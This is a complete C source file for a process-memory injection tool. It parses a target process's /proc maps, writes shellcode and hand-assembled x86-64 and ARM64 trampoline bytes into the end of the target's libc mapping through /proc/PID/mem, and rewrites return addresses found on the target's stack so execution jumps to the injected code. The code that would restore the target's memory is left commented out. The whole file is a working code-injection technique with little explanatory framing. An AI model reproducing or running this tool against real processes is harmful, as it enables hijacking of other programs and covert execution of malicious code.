#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "mem_inject.h"
#include "shellcode.h"

#define DEBUG 1
#define DELAY 8

int file_to_maps(maps_t *mapsfile, unsigned char *filebuff, long total) {
    long k = 0;
    long count = 0;
    unsigned int stage = 0;
    for (long i = 0; i < total - 1; i++) {
        if (filebuff[i] == '-' && stage == 0) {
            mapsfile[count].str_start[k] = '\x0';
            mapsfile[count].addr_start = strtoul(mapsfile[count].str_start, NULL, 16);
            k = 0;
            stage = 1;
        } else if (filebuff[i] == ' ' && stage != 6) {
            if (stage == 1) {
                mapsfile[count].str_finish[k] = '\x0';
                mapsfile[count].addr_finish = strtoul(mapsfile[count].str_finish, NULL, 16);
            } else if (stage == 2) {
                mapsfile[count].perms[k] = '\x0';
            } else if (stage == 3) {
                mapsfile[count].offset[k] = '\x0';
            } else if (stage == 4) {
                mapsfile[count].dev[k] = '\x0';
            } else if (stage == 5) {
                mapsfile[count].inode[k] = '\x0';
            }
            k = 0;
            stage += 1;
        } else if (filebuff[i] == '\n') {
            mapsfile[count].pathname[k] = '\x0';
            k = 0;
            stage = 0;
            count += 1;
        } else if (stage == 0) {
            mapsfile[count].str_start[k] = filebuff[i];
            k += 1;
        } else if (stage == 1) {
            mapsfile[count].str_finish[k] = filebuff[i];
            k += 1;
        } else if (stage == 2) {
            mapsfile[count].perms[k] = filebuff[i];
            k += 1;
        } else if (stage == 3) {
            mapsfile[count].offset[k] = filebuff[i];
            k += 1;
        } else if (stage == 4) {
            mapsfile[count].dev[k] = filebuff[i];
            k += 1;
        } else if (stage == 5) {
            mapsfile[count].inode[k] = filebuff[i];
            k += 1;
        } else if (stage == 6) {
            if (filebuff[i] != ' ') {
                mapsfile[count].pathname[k] = filebuff[i];
                k += 1;
            }
        }
    }
    return 0;
}

int maps_parser(int pid, maps_t **mfile, long *mapcount) {
    unsigned char filepath[100];

    sprintf((char *)filepath, "/proc/%d/maps", pid);
    #if DEBUG
    printf("current path is %s\n", filepath);
    #endif

    FILE *f = fopen((char *)filepath, "rb");
    if (!f) {
        #if DEBUG
        printf("[!] file not found\n");
        #endif
        return -1;
    }

    unsigned int flag = 1;
    long total = 0;
    *mapcount = 0;

    while (1) {
        unsigned char c = fgetc(f);
        total += 1;
        if (c == '\n') {
            *mapcount += 1;
        }
        if (feof(f)) {
            break;
        }
    }

    unsigned char *filebuff = malloc(total);
    *mfile = malloc(*mapcount * sizeof(maps_t));

    #if DEBUG
    printf("count is %ld\n", *mapcount);
    #endif

    fseek(f, 0, SEEK_SET);

    for (long i = 0; i < total - 1; i++) {
        filebuff[i] = fgetc(f);
        if (feof(f)) {
            break;
        }
    }

    file_to_maps(*mfile, filebuff, total);
    free(filebuff);
    return 0;
}

int machinecode_from_char(unsigned char *code, long count) {
    #if __linux__
    printf("\033[01;30mmachine code:\033[00m ");
    #else
    printf("machine code: ");
    #endif
    for (long i = 0; i < count; i++) {
        printf("%02hhx ", code[i]);
    }
    printf("\n");
    return 0;
}

int get_num_from_maps_by_name(unsigned char *mapsname, long mapsize, int n, unsigned char *name, long size, int *num) {
    int matched = 0;
    for (long i = 0; i < mapsize; i++) {
        matched = 0;
        for (long j = 0; j < size - 1; j++) {
            if (mapsname[i+j] == name[j]) {
                matched += 1;
            }
        }
        if ( matched == (size - 1) ) {
            *num = n;
            return 0;
            break;
        }
    }
    return -1;
}

long addr_in_mem(link_t *pointer_to_addr, maps_t *mapsfile, unsigned char *memory, long exec_size, long memsize, int *exec_nums, long offset, long memlimit) {
    unsigned int a, b;
    unsigned long addr;
    long acc = 0;
    for (long n = 0; n < exec_size; n++) {
        for (long i = 0; i < memsize - sizeof(addr); i++) {
            if (acc >= memlimit) {
                printf("\n");
                return acc;
            }
            a = memory[i] | (memory[i+1] << 8) | (memory[i+2] << 16) | (memory[i+3] << 24);
            b = memory[i+4] | (memory[i+5] << 8) | (memory[i+6] << 16) | (memory[i+7] << 24);
            addr = (unsigned long)b << 32 | a & 0xFFFFFFFFL;
            if (mapsfile[exec_nums[n]].addr_start < addr && addr < mapsfile[exec_nums[n]].addr_finish) {
                if (pointer_to_addr != NULL) {
                    pointer_to_addr[acc].pointer = i + offset;
                    pointer_to_addr[acc].value = addr;
                }
                acc += 1;
            }
        }
        #if DEBUG
        if (pointer_to_addr == NULL) {
            fprintf(stderr, "search_progress: %ld of %ld, found %ld of %ld\r", n+1, exec_size, acc, memlimit);
        }
        #endif
    }
    printf("\n");
    return acc;
}

int search_addr_in_mem(unsigned char *memory, long memsize, maps_t *mapsfile, int *exec_nums, long exec_size, long offset, link_t **memtable, long *memtable_count, long memlimit) {
    unsigned int a;
    unsigned int b;
    unsigned long addr;

    // check before
    unsigned long clear_count = 0;
    a = memory[0+sizeof(unsigned long)] | (memory[1+sizeof(unsigned long)] << 8) | (memory[2+sizeof(unsigned long)] << 16) | (memory[3+sizeof(unsigned long)] << 24);
    b = memory[4+sizeof(unsigned long)] | (memory[5+sizeof(unsigned long)] << 8) | (memory[6+sizeof(unsigned long)] << 16) | (memory[7+sizeof(unsigned long)] << 24);
    clear_count = (unsigned long)b << 32 | a & 0xFFFFFFFFL;
    #if DEBUG
    printf("cleared_count is %lu\n", clear_count);
    #endif
    //printf("memlimit is %lu\n", memlimit);

    // init as zeros
    if (clear_count > 0) {
        long bytecount = (clear_count + 1) * 2 * sizeof(unsigned long);
        for (long i = 0; i < bytecount; i++) {
            memory[i] = 0;
        }
    }

    *memtable_count = addr_in_mem(NULL, mapsfile, memory, exec_size, memsize, exec_nums, offset, memlimit);
    *memtable = malloc(*memtable_count * sizeof(link_t));
    //addr_in_mem(*memtable);
    addr_in_mem(*memtable, mapsfile, memory, exec_size, memsize, exec_nums, offset, memlimit);
    return 0;
}

int restore_addr_in_mem(FILE *f, link_t *memtable, long memtable_count) {
    for (long i = 0; i < memtable_count; i++) {
        fseek(f, memtable[i].pointer, SEEK_SET);
        long count = fwrite(&memtable[i].value, 1, sizeof(unsigned long), f);
        #if DEBUG
        printf("[Restored] 0x%lx -> 0x%lx\n", memtable[i].pointer, memtable[i].value);
        #endif
    }
    return 0;
}

int spoof_addr_in_mem(FILE *f, link_t *memtable, long memtable_count, unsigned long stackoffset, unsigned long offset) {
    long shift = 0;
    long count = 0;
    for (long i = 0; i < memtable_count; i++) {
        fseek(f, stackoffset, SEEK_SET);
        count = fwrite(&memtable[i].pointer, 1, sizeof(unsigned long), f);
        stackoffset += sizeof(unsigned long);
        fseek(f, stackoffset, SEEK_SET);
        count = fwrite(&memtable[i].value, 1, sizeof(unsigned long), f);
        stackoffset += sizeof(unsigned long);
        fseek(f, memtable[i].pointer, SEEK_SET);
        count = fwrite(&offset, 1, sizeof(unsigned long), f);
        #if DEBUG
        printf("[Spoofed] 0x%lx -> 0x%lx to 0x%lx\n", memtable[i].pointer, memtable[i].value, offset);
        #endif
    }
    return 0;
}

int exec_code(unsigned int pid, maps_t *mapsfile, long mapcount, unsigned char *ret_code, long ret_size, unsigned const char *code, long code_size, long memlimit) {
    unsigned char filepath[100];
    sprintf((char *)filepath, "/proc/%d/mem", pid);

    FILE *f2 = fopen((char *)filepath, "r+b");
    if (!f2) {
        #if DEBUG
        printf("[!] file not found\n");
        #endif
        return -1;
    }

    long count;
    long matched;
    unsigned char libcname[] = "libc";
    unsigned char stackname[] = "[stack]";
    unsigned char perms[] = "x";

    long exec_size = 0;
    int *exec_nums = malloc(mapcount * sizeof(int));
    int libc_num = -1;
    int stack_num = -1;

    for (int n = 0; n < mapcount; n++) {
        if (get_num_from_maps_by_name((unsigned char *)mapsfile[n].perms, sizeof(mapsfile[n].perms), n, perms, sizeof(perms), &exec_nums[exec_size]) == 0) {
            exec_size += 1;
            get_num_from_maps_by_name((unsigned char *)mapsfile[n].pathname, sizeof(mapsfile[n].pathname), n, libcname, sizeof(libcname), &libc_num);
        }
        get_num_from_maps_by_name((unsigned char *) mapsfile[n].pathname, sizeof(mapsfile[n].pathname), n, stackname, sizeof(stackname), &stack_num);
    }
    exec_nums[exec_size] = -1;
    printf("libc %d\n", libc_num);
    printf("libc 0x%lx-0x%lx\n", mapsfile[libc_num].addr_start, mapsfile[libc_num].addr_finish);
    printf("stack %d\n", stack_num);
    printf("stack 0x%lx-0x%lx\n", mapsfile[stack_num].addr_start, mapsfile[stack_num].addr_finish);

    if (stack_num == -1) {
        #if DEBUG
        printf("stack num error\n");
        #endif
        return -1;
    }

    long stacksize = mapsfile[stack_num].addr_finish - mapsfile[stack_num].addr_start;
    unsigned char *buffer = malloc(sizeof(char) * stacksize);

    fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
    count = fread(buffer, 1, stacksize, f2);
    #if DEBUG
    printf("stacksize is 0x%lx\n", count);
    #endif

    link_t *memtable = NULL;
    long memtable_count = 0;
    search_addr_in_mem(buffer, stacksize, mapsfile, exec_nums, exec_size, mapsfile[stack_num].addr_start, &memtable, &memtable_count, memlimit);

    #if DEBUG
    printf("memcount is %ld\n", memtable_count);
    #endif

    long backupsize = code_size + ret_size + sizeof(unsigned long int);
    unsigned long offset = mapsfile[libc_num].addr_finish - backupsize;
    unsigned long offset2 = offset + code_size;
    unsigned char *backup = malloc(sizeof(char) * backupsize);

    fseek(f2, offset, SEEK_SET);
    count = fread(backup, 1, backupsize, f2);
    #if DEBUG
    printf("backup count is %ld\n", count);
    #endif

    // Spoofing libc
    fseek(f2, offset, SEEK_SET);
    count = fwrite(code, 1, code_size, f2);
    fseek(f2, offset2, SEEK_SET);
    count = fwrite(ret_code, 1, ret_size, f2);
    fseek(f2, offset2 + ret_size, SEEK_SET);
    count = fwrite(&mapsfile[stack_num].addr_start, 1, sizeof(unsigned long), f2);

    // Spoofing stack
    fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
    count = fwrite(&offset, 1, sizeof(unsigned long), f2);
    fseek(f2, mapsfile[stack_num].addr_start + sizeof(unsigned long), SEEK_SET);
    count = fwrite(&memtable_count, 1, sizeof(unsigned long), f2);
    spoof_addr_in_mem(f2, memtable, memtable_count, mapsfile[stack_num].addr_start + 2*sizeof(unsigned long), offset2);

    // Restoring stack (partial)
    //sleep(DELAY);
    //fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
    //long zeroes_size = 2 * (memtable_count + 1) * sizeof(unsigned long);
    //count = fwrite(buffer, 1, zeroes_size, f2);
    //#if DEBUG
    //printf("[Restored] stack (count %d)\n", count);
    //#endif

    // Restoring libc
    //fseek(f2, offset, SEEK_SET);
    //count = fwrite(backup, 1, backupsize, f2);
    //#if DEBUG
    //printf("[Restored] libc (count %d)\n", count);
    //#endif

    fclose(f2);
    free(buffer);
    free(backup);
    free(exec_nums);
    if (memtable != NULL) {
        free(memtable);
    }
    return 0;
}

int main(int argc, const char *argv[]) {
    if (argc <= 1) {
        #if DEBUG
        printf("usage: ./mem_inject 1337\n");
        #endif
        return -1;
    }
    unsigned int pid = atoi(argv[1]);
    if (pid == 0) {
        #if DEBUG
        printf("[!] pid is %d\n", pid);
        #endif
        return -1;
    }
    long memlimit = 4096;
    if (argc > 2) {
        memlimit = atoi(argv[2]);
    }
    #if DEBUG
    printf("current pid is %d\n", pid);
    printf("memlimit is %ld\n", memlimit);
    #endif

    #ifdef __ARM_ARCH
    unsigned char ret_code[] = {0xe1, 0x3, 0x1f, 0xf8, 0xe2, 0x83, 0x1e, 0xf8, 0xe3, 0x3, 0x1e, 0xf8, 0xe4, 0x83, 0x1d, 0xf8, 0xe5, 0x3, 0x1d, 0xf8, 0xe6, 0x83, 0x1c, 0xf8, 0xe7, 0x3, 0x1c, 0xf8, 0xe8, 0x83, 0x1b, 0xf8, 0xe9, 0x3, 0x1b, 0xf8, 0xea, 0x83, 0x1a, 0xf8, 0xea, 0x3, 0x0, 0x91, 0x4a, 0x21, 0x0, 0xd1, 0x2a, 0x0, 0x0, 0x94, 0xc8, 0xb, 0x80, 0xd2, 0x1, 0x0, 0x0, 0xd4, 0xc4, 0x3, 0x40, 0xf9, 0x85, 0x0, 0x40, 0xf9, 0x63, 0x0, 0x3, 0xca, 0x83, 0x0, 0x0, 0xf9, 0x83, 0x4, 0x40, 0xf9, 0x6, 0x1, 0x80, 0xd2, 0x6, 0x0, 0x0, 0x94, 0x48, 0x1, 0x0, 0xf9, 0xfe, 0x3, 0x8, 0xaa, 0xbf, 0x0, 0x0, 0xf1, 0x21, 0x1, 0x0, 0x54, 0x20, 0x40, 0x0, 0x94, 0x63, 0x4, 0x0, 0xd1, 0xc6, 0x20, 0x0, 0x91, 0x87, 0x68, 0x66, 0xf8, 0xc6, 0x20, 0x0, 0x91, 0x88, 0x68, 0x66, 0xf8, 0xff, 0x0, 0xa, 0xeb, 0xa0, 0xfe, 0xff, 0x54, 0xbf, 0x0, 0x0, 0xf1, 0x40, 0x0, 0x0, 0x54, 0xe8, 0x0, 0x0, 0xf9, 0x7f, 0x0, 0x0, 0xf1, 0xa1, 0xfe, 0xff, 0x54, 0xfe, 0x83, 0x1f, 0xf8, 0xe0, 0x3, 0x5, 0xaa, 0xe1, 0x3, 0x5f, 0xf8, 0xe2, 0x83, 0x5e, 0xf8, 0xe3, 0x3, 0x5e, 0xf8, 0xe4, 0x83, 0x5d, 0xf8, 0xe5, 0x3, 0x5d, 0xf8, 0xe6, 0x83, 0x5c, 0xf8, 0xe7, 0x3, 0x5c, 0xf8, 0xe8, 0x83, 0x5b, 0xf8, 0xe9, 0x3, 0x5b, 0xf8, 0xea, 0x83, 0x5a, 0xf8, 0x1f, 0x0, 0x0, 0xf1, 0x0, 0x0, 0x1f, 0xd6, 0xc0, 0x3, 0x5f, 0xd6, 0xe6, 0x3, 0x1e, 0xaa, 0xd8, 0xff, 0xff, 0x97};
    # else
    unsigned char ret_code[] = {0xeb, 0x68, 0x50, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x48, 0x8b, 0x44, 0x24, 0x38, 0x48, 0x8b, 0x0, 0x48, 0x31, 0xc9, 0x48, 0x8b, 0x18, 0x48, 0x89, 0x8, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc6, 0x38, 0x48, 0x8b, 0x48, 0x8, 0x48, 0x83, 0xc0, 0x10, 0xeb, 0x8, 0x48, 0x89, 0x16, 0x48, 0x85, 0xdb, 0x74, 0x23, 0x48, 0xff, 0xc9, 0x48, 0x8b, 0x38, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x8b, 0x10, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x85, 0xdb, 0x74, 0x3, 0x48, 0x89, 0x17, 0x48, 0x31, 0xf7, 0x74, 0xda, 0x48, 0x85, 0xc9, 0x75, 0xdd, 0x48, 0x89, 0x5e, 0xf8, 0x48, 0x85, 0xdb, 0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58, 0x75, 0x4, 0x48, 0x83, 0xc4, 0x8, 0xc3, 0xe8, 0x93, 0xff, 0xff, 0xff};
    # endif

    maps_t *mapsfile = NULL;
    long mapcount;
    maps_parser(pid, &mapsfile, &mapcount);
    exec_code(pid, mapsfile, mapcount, ret_code, sizeof(ret_code), shellcode, sizeof(shellcode), memlimit);
    if (mapsfile != NULL) {
        free(mapsfile);
    }
    return -1;
}
